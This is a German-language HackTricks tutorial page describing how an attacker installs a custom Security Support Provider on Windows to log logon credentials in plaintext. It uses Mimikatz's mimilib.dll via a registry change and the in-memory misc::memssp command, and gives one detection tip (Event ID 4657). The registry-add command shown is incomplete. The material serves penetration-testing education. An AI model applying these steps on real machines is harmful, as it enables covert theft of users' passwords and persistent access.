<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) **bei oder folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>


## Benutzerdefinierte SSP

[Erfahren Sie hier, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
Sie können Ihren **eigenen SSP** erstellen, um die zum Zugriff auf die Maschine verwendeten **Anmeldeinformationen** im **Klartext** zu **erfassen**.

### Mimilib

Sie können die von Mimikatz bereitgestellte Binärdatei `mimilib.dll` verwenden. **Dies protokolliert alle Anmeldeinformationen im Klartext in einer Datei.**\
Legen Sie die DLL in `C:\Windows\System32\` ab.\
Erhalten Sie eine Liste der vorhandenen LSA-Sicherheitspakete:

{% code title="Angreifer@Ziel" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Fügen Sie `mimilib.dll` zur Liste der Sicherheitsunterstützungsanbieter (Security Packages) hinzu:
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Und nach einem Neustart können alle Anmeldeinformationen im Klartext in `C:\Windows\System32\kiwissp.log` gefunden werden.

### Im Speicher

Sie können dies auch direkt im Speicher injizieren, indem Sie Mimikatz verwenden (beachten Sie, dass dies möglicherweise etwas instabil/nicht funktionierend ist):
```powershell
privilege::debug
misc::memssp
```
Dies überlebt keine Neustarts.

### Abhilfe

Ereignis-ID 4657 - Überwachung der Erstellung/Änderung von `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
